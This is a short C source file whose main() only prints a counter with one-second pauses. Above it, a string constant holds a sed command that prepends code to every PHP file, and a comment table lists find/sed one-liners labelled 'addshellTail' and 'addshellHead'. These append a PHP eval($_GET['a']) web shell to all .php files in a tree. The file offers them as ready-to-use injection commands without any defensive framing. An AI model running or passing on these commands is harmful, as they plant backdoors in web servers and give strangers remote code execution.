#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char cmdAdd[]="sed -i \"1i <?php echo 001;?>\" *.php";
/*
--------------------------------------------------------------------------------------
find -exec     |find -name "*.php" -exec cat {} \;
---------------|----------------------------------------------------------------------
addHead        |sed -i "1i <?php echo 001;?>" *.php
---------------|----------------------------------------------------------------------
addshellTail   |find -name "*.php" -exec echo  "<?php eval($_GET['a']);?>" >> {}
---------------|----------------------------------------------------------------------
addshellHead   |find -name "*.php" -exec echo  "<?php eval($_GET['a']);?>" >> {}
--------------------------------------------------------------------------------------
*/

int main(int argc, char const *argv[])
{
    printf("hello");
    // system("curl http://www.baidu.com/ >a.txt");
    for(int i =0; i < 100;i++)
    {
        sleep(1);
        printf("%d\n",i);
    }


    return 0;
}